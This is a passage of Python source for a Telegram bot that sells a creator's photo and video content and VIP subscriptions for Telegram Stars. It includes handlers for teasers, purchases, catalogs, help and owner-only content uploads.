VIP Exclusive\")\n                elif len(file_path) > 50 and not file_path.startswith('/'):\n                    # It's a Telegram file_id\n                    try:\n                        bot.send_photo(message.chat.id, file_path, caption=f\"💎 VIP Exclusive\")\n                    except:\n                        try:\n                            bot.send_video(message.chat.id, file_path, caption=f\"💎 VIP Exclusive\")\n                        except:\n                            bot.send_message(message.chat.id, f\"💎 Your exclusive VIP teaser is ready, but there was a technical issue. Please contact me directly!\")\n                else:\n                    # It's a local file path\n                    with open(file_path, 'rb') as file:\n                        if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):\n                            bot.send_photo(message.chat.id, file, caption=f\"💎 VIP Exclusive\")\n                        elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):\n                            bot.send_video(message.chat.id, file, caption=f\"💎 VIP Exclusive\")\n                        else:\n                            bot.send_document(message.chat.id, file, caption=f\"💎 VIP Exclusive\")\n            except Exception as e:\n                logger.error(f\"Error sending VIP teaser: {e}\")\n                bot.send_message(message.chat.id, f\"💎 Your exclusive VIP teaser is ready, but there was a technical issue. Please contact me directly!\")\n        else:\n            # No VIP teasers available, show default VIP message\n            teaser_text = f\"\"\"\n💎 <b>VIP EXCLUSIVE TEASERS</b> 💎\n\n🎉 Special VIP preview just for you!\n\n<i>[VIP members get access to premium teasers, behind-the-scenes content, and exclusive previews not available to regular users]</i>\n\n🌟 <b>VIP Perks Active:</b>\n• Unlimited free access to all content\n• Exclusive VIP-only content\n• Direct personal communication priority\n• Monthly bonus content drops\n\n⏰ Your VIP expires in {vip_status['days_left']} days\n\n💕 You're absolutely amazing for being VIP! Here's what's new this week...\n\n✨ <i>\"The best content is exclusively yours!\"</i> ✨\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"🎁 Access All VIP Content FREE\", callback_data=\"browse_content\"))\n            markup.add(types.InlineKeyboardButton(\"🔄 Extend VIP Membership\", callback_data=\"vip_access\"))\n        \n    else:\n        # Get teasers from database\n        teasers = get_teasers()\n        \n        if teasers:\n            # Send first teaser (most recent)\n            file_path, file_type, description = teasers[0]\n            \n            # Escape HTML characters in description to prevent parsing errors\n            safe_description = description.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n            \n            teaser_text = f\"\"\"\n🎬 <b>FREE TEASER CONTENT</b> 🎬\n\nHere's a little preview of what's waiting for you in my exclusive collection...\n\n{safe_description}\n\n💝 This is just a taste of what I have for my special fans. Want to see more? Check out my full content library!\n\n💡 <b>VIP members get:</b>\n• FREE access to ALL content\n• Exclusive VIP-only teasers (like this one, but better!)\n• Direct personal chat priority\n• Monthly bonus content\n\n<i>\"Babe, you haven't seen anything yet. The best is just getting started....\"</i> ✨\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"💎 Elevate to VIP for FREE Access\", callback_data=\"vip_access\"))\n            markup.add(types.InlineKeyboardButton(\"🛒 Browse Content to Purchase\", callback_data=\"browse_content\"))\n            \n            bot.send_message(message.chat.id, teaser_text, reply_markup=markup, parse_mode='HTML')\n            \n            # Send the actual teaser media\n            try:\n                if file_path.startswith('http'):\n                    # It's a URL\n                    if file_type == 'photo':\n                        bot.send_photo(message.chat.id, file_path, caption=\"🎬 Free Teaser Preview\")\n                    elif file_type == 'video':\n                        bot.send_video(message.chat.id, file_path, caption=\"🎬 Free Teaser Preview\")\n                elif len(file_path) > 50 and not file_path.startswith('/'):\n                    # It's a Telegram file_id\n                    if file_type == 'photo':\n                        bot.send_photo(message.chat.id, file_path, caption=\"🎬 Free Teaser Preview\")\n                    elif file_type == 'video':\n                        bot.send_video(message.chat.id, file_path, caption=\"🎬 Free Teaser Preview\")\n                else:\n                    # It's a local file path\n                    with open(file_path, 'rb') as file:\n                        if file_type == 'photo':\n                            bot.send_photo(message.chat.id, file, caption=\"🎬 Free Teaser Preview\")\n                        elif file_type == 'video':\n                            bot.send_video(message.chat.id, file, caption=\"🎬 Free Teaser Preview\")\n            except Exception as e:\n                logger.error(f\"Error sending teaser media: {e}\")\n                bot.send_message(message.chat.id, \"🎬 Teaser content is being prepared...\")\n            \n            return\n        \n        # No teasers available - show \"COMING SOON\"\n        teaser_text = \"\"\"\n🎬 <b>FREE TEASER</b> 🎬\n\nHere's a little preview of what's waiting for you in my exclusive collection...\n\n<b>COMING SOON</b>\n\n💝 That was just a sneak peek, darling. Want the real deal? Check out my full content library!\n\n💡 <b>VIP members get:</b>\n• FREE access to ALL content\n• Exclusive VIP-only teasers (like this one, but better!)\n• Direct personal chat priority\n• Monthly bonus content\n\n✨ <i>\"The best is yet to come...\"</i> ✨\n\"\"\"\n        \n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"💎 Upgrade to VIP for FREE Access\", callback_data=\"vip_access\"))\n        markup.add(types.InlineKeyboardButton(\"🛒 Browse Content to Purchase\", callback_data=\"browse_content\"))\n    \n    bot.send_message(message.chat.id, teaser_text, reply_markup=markup, parse_mode='HTML')\n\n@bot.message_handler(commands=['buy'])\ndef buy_command(message):\n    \"\"\"Handle /buy command\"\"\"\n    add_or_update_user(message.from_user)\n    \n    # Parse command for specific item\n    command_parts = message.text.split(' ', 1)\n    if len(command_parts) > 1:\n        item_name = command_parts[1].strip()\n        # Try to find and purchase specific item\n        purchase_item(message.chat.id, message.from_user.id, item_name)\n    else:\n        # Show available content for purchase\n        show_content_catalog(message.chat.id)\n\ndef purchase_item(chat_id, user_id, item_name):\n    \"\"\"Process purchase for specific item - ONLY allows purchases of 'browse' content\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    # Only allow purchases of 'browse' content - VIP content is subscription-only\n    cursor.execute('SELECT name, price_stars, file_path, description, created_date, content_type FROM content_items WHERE name = ? AND content_type = ?', (item_name, 'browse'))\n    item = cursor.fetchone()\n    conn.close()\n    \n    if item:\n        name, price_stars, file_path, description, created_date, content_type = item\n        \n        # Verify this is browse content (double-check)\n        if content_type != 'browse':\n            bot.send_message(chat_id, f\"❌ '{item_name}' is VIP-exclusive content and cannot be purchased individually. Please upgrade to VIP to access this content.\")\n            return\n        \n        # Check if user already owns this content\n        if check_user_owns_content(user_id, name):\n            bot.send_message(chat_id, f\"✅ You already own '{name}'! Use 'My Content' to access it again.\")\n            return\n        \n        # Create invoice for Telegram Stars\n        prices = [types.LabeledPrice(label=name, amount=price_stars)]\n        \n        bot.send_invoice(\n            chat_id=chat_id,\n            title=f\"Browse Content: {name}\",\n            description=description,\n            invoice_payload=f\"content_{name}_{user_id}\",\n            provider_token=None,  # None for Telegram Stars\n            currency='XTR',  # Telegram Stars currency\n            prices=prices,\n            start_parameter='purchase'\n        )\n    else:\n        # Check if it's VIP content that user is trying to purchase\n        conn = sqlite3.connect('content_bot.db')\n        cursor = conn.cursor()\n        cursor.execute('SELECT name, content_type FROM content_items WHERE name = ?', (item_name,))\n        vip_check = cursor.fetchone()\n        conn.close()\n        \n        if vip_check and vip_check[1] == 'vip':\n            bot.send_message(chat_id, f\"❌ '{item_name}' is VIP-exclusive content and cannot be purchased individually.\\n\\n💎 Upgrade to VIP subscription for unlimited access to all VIP content!\")\n        else:\n            bot.send_message(chat_id, f\"❌ Content '{item_name}' not found in browse catalog. Check /help for available content.\")\n\ndef show_vip_access(chat_id, user_id):\n    \"\"\"Show VIP access options and current status\"\"\"\n    vip_status = check_vip_status(user_id)\n    vip_price = int(get_vip_settings('vip_price_stars') or 399)\n    vip_description = get_vip_settings('vip_description') or 'Premium VIP access with exclusive content and direct chat'\n    \n    if vip_status['is_vip']:\n        # User is already VIP\n        status_text = f\"\"\"\n💎 <b>VIP MEMBER STATUS</b> 💎\n\n🎉 You are currently a VIP member!\n⏰ <b>Expires in:</b> {vip_status['days_left']} days\n\n🌟 <b>Your VIP Benefits:</b>\n• Unlimited exclusive content access\n• Direct personal chat with me\n• Priority responses to messages\n• Special VIP-only teasers and previews\n• Monthly exclusive photo sets\n• Behind-the-scenes content\n\n💫 Want to extend your VIP membership?\n\"\"\"\n        \n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(f\"🔄 Extend VIP ({vip_price:,} Stars)\", callback_data=\"buy_vip\"))\n        markup.add(types.InlineKeyboardButton(\"🎬 VIP Teasers Collection\", callback_data=\"vip_teasers_collection\"))\n        markup.add(types.InlineKeyboardButton(\"🛒 Browse Content\", callback_data=\"browse_content\"))\n        markup.add(types.InlineKeyboardButton(\"🏠 Back to Main\", callback_data=\"cmd_start\"))\n        \n    else:\n        # User is not VIP\n        status_text = f\"\"\"\n🌟 <b>BECOME A VIP MEMBER</b> 🌟\n\n💰 <b>Price:</b> {vip_price} Telegram Stars/month\n📅 <b>Duration:</b> 30 days\n\n💎 <b>VIP Benefits Include:</b>\n• Unlimited access to all exclusive content\n• Direct personal chat with me\n• Priority responses to all your messages\n• Special VIP-only teasers and previews\n• Monthly exclusive photo sets\n• Behind-the-scenes content and stories\n• Early access to new content\n\n✨ <b>\"{vip_description}\"</b>\n\n🚀 Ready to become VIP and get unlimited access?\n\"\"\"\n        \n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(f\"💎 Subscribe VIP ({vip_price:,} Stars)\", callback_data=\"buy_vip\"))\n        markup.add(types.InlineKeyboardButton(\"🎬 View Free VIP Teasers\", callback_data=\"teasers\"))\n        markup.add(types.InlineKeyboardButton(\"🏠 Back to Main\", callback_data=\"cmd_start\"))\n    \n    bot.send_message(chat_id, status_text, reply_markup=markup, parse_mode='HTML')\n\ndef purchase_vip_subscription(chat_id, user_id):\n    \"\"\"Process VIP subscription purchase\"\"\"\n    vip_price = int(get_vip_settings('vip_price_stars') or 399)\n    vip_description = get_vip_settings('vip_description') or 'Premium VIP access'\n    \n    # Create invoice for VIP subscription\n    prices = [types.LabeledPrice(label=\"VIP Subscription\", amount=vip_price)]\n    \n    bot.send_invoice(\n        chat_id=chat_id,\n        title=\"🌟 VIP Membership Subscription\",\n        description=f\"{vip_description} - 30 days unlimited access\",\n        invoice_payload=f\"vip_subscription_{user_id}\",\n        provider_token=None,  # None for Telegram Stars\n        currency='XTR',  # Telegram Stars currency\n        prices=prices,\n        start_parameter='vip_purchase'\n    )\n\ndef show_content_catalog(chat_id, user_id=None):\n    \"\"\"Show available BROWSE content for purchase - does not include VIP-only content\"\"\"\n    # Get user ID if not provided (for callback compatibility)\n    if user_id is None:\n        # This is a fallback for when called from callback without user_id\n        # In practice, we should always pass user_id\n        user_id = chat_id  # Assuming direct message context\n    \n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    # Only show content marked as 'browse' type - not VIP-only content\n    cursor.execute('SELECT name, price_stars, description FROM content_items WHERE content_type = ?', ('browse',))\n    items = cursor.fetchall()\n    conn.close()\n    \n    if items:\n        catalog_text = \"<b>BROWSING CONTENT</b> 🛒\\n\\n\"\n        catalog_text += \"💰 Purchase Specific items with Telegram Stars\\n\"\n        catalog_text += \"💡 <b>Tip:</b> VIP members get access to exclusive VIP content library!\\n\\n\"\n        \n        markup = types.InlineKeyboardMarkup()\n        \n        # Add VIP buttons at the top first, followed by My Content\n        markup.add(types.InlineKeyboardButton(\"💎 Upgrade to VIP\", callback_data=\"vip_access\"))\n        markup.add(types.InlineKeyboardButton(\"💎 Access VIP Content Library\", callback_data=\"vip_content_catalog\"))\n        markup.add(types.InlineKeyboardButton(\"📁 My Content\", callback_data=\"my_content\"))\n        \n        for name, price, description in items:\n            # Escape HTML special characters to prevent parsing errors\n            safe_name = name.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n            safe_description = description.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n            \n            catalog_text += f\"✨ <b>{safe_name}</b>\\n\"\n            \n            # Check if user already owns this content\n            owns_content = check_user_owns_content(user_id, name)\n            \n            if owns_content:\n                catalog_text += f\"✅ <b>OWNED</b> - You already purchased this!\\n\"\n                markup.add(types.InlineKeyboardButton(f\"🎁 Access {name} (Owned)\", callback_data=f\"access_{name}\"))\n            else:\n                catalog_text += f\"💰 {price:,} Stars\\n\"\n                markup.add(types.InlineKeyboardButton(f\"⭐ Buy {name} ({price:,} Stars)\", callback_data=f\"buy_{name}\"))\n            \n            catalog_text += f\"📝 {safe_description}\\n\\n\"\n        \n        # VIP buttons already added at the top\n        \n        # Add back button\n        markup.add(types.InlineKeyboardButton(\"🏠 Back to Main\", callback_data=\"cmd_start\"))\n        \n        bot.send_message(chat_id, catalog_text, reply_markup=markup, parse_mode='HTML')\n    else:\n        bot.send_message(chat_id, \"No browse content available right now. Check back soon! 💕\\n\\n💎 VIP members have access to exclusive VIP content library!\")\n\ndef show_vip_catalog(chat_id, user_id=None):\n    \"\"\"Show VIP-only content catalog - requires active VIP subscription\"\"\"\n    # Get user ID if not provided (for callback compatibility)\n    if user_id is None:\n        user_id = chat_id  # Assuming direct message context\n    \n    # Check VIP status - must be VIP to access this catalog\n    vip_status = check_vip_status(user_id)\n    if not vip_status['is_vip']:\n        # Not VIP - show upgrade prompt\n        no_vip_message = \"\"\"\n💎 <b>VIP CONTENT</b> 💎\n\n🚫 <b>VIP Membership Required!</b>\n\nThis exclusive content is only available to VIP members. Upgrade now to unlock:\n\n✨ <b>VIP-Only Benefits:</b>\n• Exclusive VIP content library\n• Premium photos and videos\n• Behind-the-scenes content\n• Direct personal chat access\n• Priority responses\n\n🚀 Ready to upgrade and unlock everything?\n\"\"\"\n        \n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"💎 Become a VIP\", callback_data=\"vip_access\"))\n        markup.add(types.InlineKeyboardButton(\"🛒 Browse Regular Content\", callback_data=\"browse_content\"))\n        markup.add(types.InlineKeyboardButton(\"🏠 Back to Main\", callback_data=\"cmd_start\"))\n        \n        bot.send_message(chat_id, no_vip_message, reply_markup=markup, parse_mode='HTML')\n        return\n    \n    # User is VIP - show VIP content library\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    # Only show content marked as 'vip' type\n    cursor.execute('SELECT name, price_stars, description FROM content_items WHERE content_type = ?', ('vip',))\n    vip_items = cursor.fetchall()\n    conn.close()\n    \n    if vip_items:\n        catalog_text = f\"💎 <b>VIP EXCLUSIVE CONTENT </b> 💎\\n\\n\"\n        catalog_text += f\"🎉 Welcome VIP member! Free access to all VIP content!\\n\"\n        catalog_text += f\"⏰ Your VIP expires in {vip_status['days_left']} days\\n\\n\"\n        catalog_text += f\"📚 <b>{len(vip_items)} exclusive VIP items available:</b>\\n\\n\"\n        \n        markup = types.InlineKeyboardMarkup()\n        \n        for name, price, description in vip_items:\n            # Escape HTML special characters to prevent parsing errors\n            safe_name = name.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n            safe_description = description.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n            \n            catalog_text += f\"💎 <b>{safe_name}</b>\\n\"\n            catalog_text += f\"🆓 <b>VIP FREE ACCESS</b>\\n\"\n            catalog_text += f\"📝 {safe_description}\\n\\n\"\n            \n            # Add free access button for VIP content\n            markup.add(types.InlineKeyboardButton(f\"💎 Access {name} (VIP FREE)\", callback_data=f\"vip_get_{name}\"))\n        \n        # Add navigation buttons\n        markup.add(types.InlineKeyboardButton(\"🛒 Browse Regular Content\", callback_data=\"browse_content\"))\n        markup.add(types.InlineKeyboardButton(f\"🔄 Extend VIP\", callback_data=\"buy_vip\"))\n        markup.add(types.InlineKeyboardButton(\"🏠 Back to Main\", callback_data=\"cmd_start\"))\n        \n        bot.send_message(chat_id, catalog_text, reply_markup=markup, parse_mode='HTML')\n    else:\n        # No VIP content available\n        no_content_message = f\"\"\"\n💎 <b>VIP EXCLUSIVE CONTENT</b> 💎\n\n🎉 Welcome VIP member!\n⏰ Your VIP expires in {vip_status['days_left']} days\n\n📂 <b>VIP Content Status:</b>\n🚧 No exclusive VIP content available yet, but stay tuned!\n\nMore premium VIP content is being added regularly. Check back soon for exclusive releases!\n\n💡 <b>Meanwhile:</b> You can still browse and purchase regular content.\n\"\"\"\n        \n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"🛒 Browse Regular Content\", callback_data=\"browse_content\"))\n        markup.add(types.InlineKeyboardButton(f\"🔄 Extend VIP\", callback_data=\"buy_vip\"))\n        markup.add(types.InlineKeyboardButton(\"🏠 Back to Main\", callback_data=\"cmd_start\"))\n        \n        bot.send_message(chat_id, no_content_message, reply_markup=markup, parse_mode='HTML')\n\n@bot.message_handler(commands=['help'])\ndef help_command(message):\n    \"\"\"Handle /help command\"\"\"\n    add_or_update_user(message.from_user)\n    \n    help_text = \"\"\"\n🔥💋 **Ready to turn up the heat? Gigi Torres** \n\n**HOW TO INTERACT WITH THE BOT**\n\n💬 **VIP Exclusive Chat:**\nWant to get up close and personal? Only VIPs get direct access to me. Upgrade now and let’s make it extra special. 😘\n\n⭐ **Telegram Stars:**\nUse Telegram Stars to purchase my exclusive content.\n\n🎯 **Quick Actions:**\nUse the buttons below to navigate - no need to type commands!\n\n💕 Got questions? Baby, just join the VIP. I see everything.\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=2)\n    # Row 1: Main actions\n    markup.add(\n        types.InlineKeyboardButton(\"🏠 VIPZone\", callback_data=\"cmd_start\"),\n        types.InlineKeyboardButton(\"🎬 Free VIP Teasers\", callback_data=\"cmd_teaser\")\n    )\n    # Row 2: Shopping\n    markup.add(\n        types.InlineKeyboardButton(\"🛒 Content Showcase\", callback_data=\"browse_content\"),\n        types.InlineKeyboardButton(\"💬 Contact Me\", callback_data=\"ask_question\")\n    )\n    # Row 3: My Content and VIP Library\n    markup.add(\n        types.InlineKeyboardButton(\"📂 My Content\", callback_data=\"my_content\"),\n        types.InlineKeyboardButton(\"💎 VIP Collection\", callback_data=\"vip_content_catalog\")\n    )\n    # Row 4: VIP Teasers\n    markup.add(types.InlineKeyboardButton(\"🎬 VIP Teasers\", callback_data=\"vip_teasers_collection\"))\n    # Row 5: Help refresh\n    markup.add(types.InlineKeyboardButton(\"🔄 Refresh Help\", callback_data=\"cmd_help\"))\n    \n    bot.send_message(message.chat.id, help_text, reply_markup=markup, parse_mode='Markdown')\n\n# Owner/Admin commands\n\n@bot.message_handler(commands=['owner_add_content'])\ndef owner_add_content(message):\n    \"\"\"Handle /owner_add_content command with automatic URL processing\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    try:\n        # Parse command: /owner_add_content [name] [price_stars] [file_path_or_url] [description]\n        parts = message.text.split(' ', 4)\n        if len(parts) < 4:\n            help_text = \"\"\"❌ Usage: /owner_add_content [name] [price_stars] [file_path_or_url] [description]\n\n🔗 **URL Support:** External image URLs are automatically downloaded and converted to permanent Telegram file_ids!\n\n📝 **Examples:**\n• `/owner_add_content beach_photo 25 https://yyamen.com/image.jpg Beautiful beach sunset`\n• `/owner_add_content vip_content 50 AgACAgIAAxkBAAI... Exclusive content`\n\n💡 **Supported URLs:** Any direct image URL (JPG, PNG, GIF, WebP)\"\"\"\n            bot.send_message(message.chat.id, help_text)\n            return\n        \n        name = parts[1]\n        price_stars = int(parts[2])\n        file_path = parts[3]\n        description = parts[4] if len(parts) > 4 else \"Exclusive content\"\n        \n        # Check if this name already exists\n        conn = sqlite3.connect('content_bot.db')\n        cursor = conn.cursor()\n        cursor.execute('SELECT name FROM content_items WHERE name = ?', (name,))\n        existing = cursor.fetchone()\n        conn.close()\n        \n        if existing:\n            bot.send_message(message.chat.id, f\"❌ Content with name '{name}' already exists! Choose a different name or use a different command to update it.\")\n            return\n        \n        # Process external URLs automatically\n        processed_file_path = file_path\n        file_type_info = \"\"\n        \n        if file_path.startswith('http'):\n            # It's an external URL - download and convert to Telegram file_id\n            bot.send_message(message.chat.id, f\"🔗 External URL detected! Converting to permanent Telegram file_id...\\n\\n📥 URL: {file_path}\")\n            \n            success, result, file_type = download_and_upload_image(file_path, message.chat.id)\n            \n            if success:\n                processed_file_path = result  # This is now the Telegram file_id\n                file_type_info = f\"\\n📁 File Type: {file_type.title()}\"\n                bot.send_message(message.chat.id, f\"🎉 URL successfully converted to permanent Telegram file_id!\\n\\n🔄 Original URL: {file_path}\\n✅ New File ID: {result[:50]}...\")\n            else:\n                # Download failed - show error and don't save\n                bot.send_message(message.chat.id, f\"💥 URL Processing Failed!\\n\\n{result}\\n\\n🔍 **Troubleshooting:**\\n• Verify the URL points directly to an image\\n• Check if the site allows hotlinking\\n• Try a different image URL\\n• Upload the file manually instead\")\n                return\n        \n        # Save to database (with processed file_path)\n        conn = sqlite3.connect('content_bot.db')\n        cursor = conn.cursor()\n        cursor.execute('''\n            INSERT INTO content_items (name, price_stars, file_path, description, created_date, content_type)\n            VALUES (?, ?, ?, ?, ?, ?)\n        ''', (name, price_stars, processed_file_path, description, datetime.datetime.now().isoformat(), 'browse'))\n        conn.commit()\n        conn.close()\n        \n        # Success message with details\n        success_message = f\"\"\"✅ **CONTENT ADDED SUCCESSFULLY!** ✅\n\n📦 **Name:** {name}\n💰 **Price:** {price_stars:,} Stars\n📝 **Description:** {description}{file_type_info}\n🔄 **File:** {\"Telegram File ID (converted from URL)\" if file_path.startswith('http') else \"Direct Path/ID\"}\n\n🛒 **Ready for sale!** Fans can now purchase this content using:\n• Browse Content menu\n• `/buy {name}` command\n\n💡 **Note:** {(\"Original URL was automatically converted to a permanent Telegram file_id to prevent hotlinking issues!\" if file_path.startswith('http') else \"File is ready for delivery!\")}\"\"\"\n        \n        bot.send_message(message.chat.id, success_message, parse_mode='Markdown')\n        \n    except ValueError:\n        bot.send_message(message.chat.id, \"❌ Invalid price! Please enter a number for Stars.\\n\\nExample: `/owner_add_content my_content 25 https://example.com/image.jpg Description here`\")\n    except Exception as e:\n        logger.error(f\"Error in owner_add_content: {e}\")\n        bot.send_message(message.chat.id, f\"❌ Error adding content: {str(e)}\\n\\nPlease check your command format and try again.\")\n\n@bot.message_handler(commands=['owner_delete_content'])\ndef owner_delete_content(message):\n    \"\"\"Handle /owner_delete_content command\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    parts = message.text.split(' ', 1)\n    if len(parts) < 2:\n        bot.send_message(message.chat.id, \"❌ Usage: /owner_delete_content [name]\")\n        return\n    \n    name = parts[1]\n    \n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('DELETE FROM content_items WHERE name = ?', (name,))\n    deleted_count = cursor.rowcount\n    conn.commit()\n    conn.close()\n    \n    if deleted_count > 0:\n        bot.send_message(message.chat.id, f\"✅ Content '{name}' deleted successfully!\")\n    else:\n        bot.send_message(message.chat.id, f\"❌ Content '{name}' not found.\")\n\n@bot.message_handler(commands=['owner_upload'])\ndef owner_upload_content(message):\n    \"\"\"Handle /owner_upload command - start guided upload flow\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    # Initialize upload session\n    upload_sessions[OWNERS[0]] = {\n        'step': 'waiting_for_file',\n        'name': None,\n        'price': None,\n        'description': None,\n        'file_path': None\n    }\n    \n    upload_text = \"\"\"\n📤 <b>GUIDE FOR UPLOADING CONTENT</b> 📤\n\nI'll help you upload new content step by step!\n\n<b>Step 1:</b> Send me the file (photo, video, or document)\n- Just upload/send the file directly to this chat\n- Supported: Photos, Videos, Documents\n\nAfter you send the file, I'll ask for the name, price, and description.\n\n💡 <b>Tip:</b> You can also use /owner_add_content [name] [price] [url] [description] for web URLs.\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(\"❌ Cancel Upload\", callback_data=\"cancel_upload\"))\n    \n    bot.send_message(message.chat.id, upload_text, reply_markup=markup, parse_mode='HTML')\n\n@bot.message_handler(content_types=['photo', 'video', 'document', 'animation'], func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') not in ['teaser', 'vip_content', 'vip_teaser'] and upload_sessions[OWNER_ID].get('step') == 'waiting_for_file')\ndef handle_file_upload(message):\n    \"\"\"Handle file uploads for content creation (excludes teaser sessions)\"\"\"\n    logger.info(f\"General content handler triggered - Content type: {message.content_type}, Session: {upload_sessions.get(OWNER_ID, 'None')}\")\n    \n    # Check if we're in any upload session\n    if OWNER_ID not in upload_sessions or upload_sessions[OWNER_ID]['step'] != 'waiting_for_file':\n        bot.send_message(message.chat.id, \"📤 To upload content, start with `/owner_upload` or use VIP upload!\")\n        return\n    \n    # Get file info based on content type\n    file_info = None\n    file_type = \"\"\n    \n    if message.content_type == 'photo':\n        file_info = bot.get_file(message.photo[-1].file_id)  # Get highest resolution\n        file_type = \"Photo\"\n    elif message.content_type == 'video':\n        file_info = bot.get_file(message.video.file_id)\n        file_type = \"Video\"\n    elif message.content_type == 'animation':\n        file_info = bot.get_file(message.animation.file_id)\n        file_type = \"GIF\"\n    elif message.content_type == 'document':\n        file_info = bot.get_file(message.document.file_id)\n        # Check if document is actually a video or gif\n        if hasattr(message.document, 'file_name') and message.document.file_name:\n            file_name = message.document.file_name.lower()\n            if file_name.endswith(('.mp4', '.mov', '.avi', '.mkv', '.webm')):\n                file_type = \"Video\"\n            elif file_name.endswith(('.gif')):\n                file_type = \"GIF\"\n            elif file_name.endswith(('.jpg', '.jpeg', '.png', '.webp')):\n                file_type = \"Photo\"\n            else:\n                file_type = \"Document\"\n        else:\n            # Check MIME type as fallback\n            mime_type = getattr(message.document, 'mime_type', '')\n            if mime_type.startswith('video/'):\n                file_type = \"Video\"\n            elif mime_type == 'image/gif':\n                file_type = \"GIF\"\n            elif mime_type.startswith('image/'):\n                file_type = \"Photo\"\n            else:\n                file_type = \"Document\"\n    \n    if file_info:\n        # Store file_id instead of download URL to avoid exposing bot token\n        file_id = None\n        if message.content_type == 'photo':\n            file_id = message.photo[-1].file_id\n        elif message.content_type == 'video':\n            file_id = message.video.file_id\n        elif message.content_type == 'animation':\n            file_id = message.animation.file_id\n        elif message.content_type == 'document':\n            file_id = message.document.file_id\n        else:\n            bot.send_message(message.chat.id, \"❌ Unsupported file type. Please send a photo, video, animation\")\n            return\n        \n        # Check if this is a VIP upload session\n        session = upload_sessions[OWNERS[0]]\n        if session.get('type') == 'vip_content':\n            handle_vip_file_upload(message, file_id, file_type)\n            return\n        \n        # Regular content upload\n        upload_sessions[OWNER_ID]['file_path'] = file_id  # Store file_id instead of URL\n        upload_sessions[OWNER_ID]['file_type'] = file_type\n        upload_sessions[OWNER_ID]['step'] = 'waiting_for_name'\n        \n        # Ask for content name\n        name_text = f\"\"\"\n✅ **{file_type} uploaded successfully!**\n\n<b>Step 2:</b> What should I call this content?\nType a unique name (no spaces, use underscores):\n\nExample: beach_photoshoot_1 or exclusive_video_dec\n\nThis name will be used internally to identify the content.\n\"\"\"\n        \n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"❌ Cancel Upload\", callback_data=\"cancel_upload\"))\n        \n        bot.send_message(message.chat.id, name_text, reply_markup=markup, parse_mode='HTML')\n\n@bot.message_handler(func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions)\ndef handle_upload_flow(message):\n    \"\"\"Handle the guided upload flow steps\"\"\"\n    if OWNERS[0] not in upload_sessions:\n        return\n    \n    session = upload_sessions[OWNERS[0]]\n    \n    # Handle VIP upload flow\n    if session.get('type') == 'vip_content':\n        if session['step'] == 'waiting_for_name':\n            handle_vip_name_input(message)\n            return\n        elif session['step'] == 'waiting_for_description':\n            handle_vip_description_input(message)\n            return\n    \n    # Handle VIP settings flow  \n    if session.get('type') == 'vip_settings':\n        if session['step'] == 'waiting_for_input':\n            handle_vip_settings_input(message)\n            return\n    \n    # Regular upload flow continues below\n    \n    if session['step'] == 'waiting_for_name':\n        # Validate name (no spaces, alphanumeric + underscores)\n        name = message.text.strip()\n        if not name or ' ' in name or not all(c.isalnum() or c == '_' for c in name):\n            bot.send_message(message.chat.id, \"❌ Invalid name! Use only letters, numbers, and underscores (no spaces).\\nExample: beach_photos_1\")\n            return\n        \n        # Check if name already exists\n        conn = sqlite3.connect('content_bot.db')\n        cursor = conn.cursor()\n        cursor.execute('SELECT name FROM content_items WHERE name = ?', (name,))\n        existing = cursor.fetchone()\n        conn.close()\n        \n        if existing:\n            bot.send_message(message.chat.id, f\"❌ Content with name '{name}' already exists! Choose a different name.\")\n            return\n        \n        session['name'] = name\n        session['step'] = 'waiting_for_price'\n        \n        price_text = f\"\"\"\n✅ <b>Name set:</b> {name}\n\n<b>Step 3:</b> How much should this cost?\nEnter the price in Telegram Stars (just the number):\n\nExamples: 25, 50, 100\n\n💡 Typical prices:\n• Photo sets: 20-50 Stars\n• Videos: 50-200 Stars\n• Exclusive content: 100+ Stars\n\"\"\"\n        \n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"❌ Cancel Upload\", callback_data=\"cancel_upload\"))\n        \n        bot.send_message(message.chat.id, price_text, reply_markup=markup, parse_mode='HTML')\n    \n    elif session['step'] == 'waiting_for_price':\n        try:\n            price = int(message.text.strip())\n            if price <= 0:\n                bot.send_message(message.chat.id, \"❌ Price must be a positive number!\")\n                return\n            \n            session['price'] = price\n            session['step'] = 'waiting_for_description'\n            \n            desc_text = f\"\"\"\n✅ <b>Price set:</b> {price:,} Stars\n\n<b>Step 4:</b> Add a description (optional)\nWrite a short description that customers will see:\n\nExample: \"Exclusive behind-the-scenes photos from my latest shoot\"\n\nOr type skip to use a default 